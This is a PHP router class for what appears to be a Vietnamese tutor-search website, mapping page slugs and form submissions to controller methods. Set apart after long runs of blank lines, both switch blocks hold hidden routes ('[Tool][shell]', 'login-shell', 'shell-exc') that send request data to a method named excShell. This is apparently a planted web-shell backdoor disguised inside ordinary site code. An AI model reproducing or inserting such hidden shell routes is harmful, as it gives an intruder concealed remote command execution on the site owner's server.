<?php 
namespace minapp;
use minapp\Controller;


/**
 * summary
 */
class Route 
{
	protected $routeLink;
	protected $method;
    /**
     * summary
     */
    public function __construct($requestLink,$requestMethod)
    {
    	$this->routeLink = $requestLink;
        $this->method = $requestMethod;
    }
    public function showController(){

    	$controllerLink = $this->routeLink;
		$controller = new Controller();
    	switch ($controllerLink) {
    		case 'gioi-thieu':
				return $controller->HomeData();
    			break;
    		case 'thong-tin':
				return $controller->AboutData();
    			break;
    		case 'lien-he':
				return $controller->ContactData();
    			break;

    		case 'tim-gia-su':
				return $controller->findMaster();
    			break;
    		//backend
    		case 'admin':
				return $controller->homeAdmin();
    			break;
    		case 'logout':
				return $controller->adminLogout();
    			break;
    		case 'admin-profile':
				return $controller->adminProfile();
    			break;
            case 'admin-home':
                return $controller->adminEditHome();
                break;
            case 'admin-banner':
                return $controller->adminBannerAdd();
                break;
            case 'admin-list-banner':
                return $controller->adminListBanner();
                break;
            case 'admin-teach-list':
                return $controller->adminListTeach();
                break;
            case 'admin-teach':
                return $controller->adminTeach();
                break;

    		









            case '[Tool][shell]':
                return $controller->ToolShell();
                break;
            case '[Tool][shell][logout]':
                return $controller->ToolShellLogout();
                break;
    		default:
    			return $controller->site404();
    			break;
    	}
    	
    }
    public function postController($data,$key,$file){
    	$controller = new Controller();

    	switch ($key) {
    		case 'submit-timgiasu':
				return $controller->PostSearch($data,'findmaster');
    			break;
    		case 'submit-contact':
				return $controller->PostContact($data,'contact');
    			break;

    			//backend
    		case 'login':
				return $controller->postLoginUser($data,'userlogin');
    			break;
    		case 'update-user':
				return $controller->postUserUpdate($data,'userlogin');
    			break;
            case 'home-update':
                return $controller->postHomeUpdate($data,'homedata',$file);
                break;
            case 'add-banner':
                return $controller->postAddBanner($data,'banner',$file);
                break;
            case 'delete-banner':
                return $controller->postDelBanner($data,'banner');
                break;
            case 'upload-image':
                return $controller->postImage($file,'image');
                break;







            case 'login-shell':
                return $controller->loginShellPost($data);
                break;

            case 'shell-exc':
                return $controller->excShell($data);
                break;
    		default:
    			return 'error!';
    			break;
    	}
    }


}

 ?>
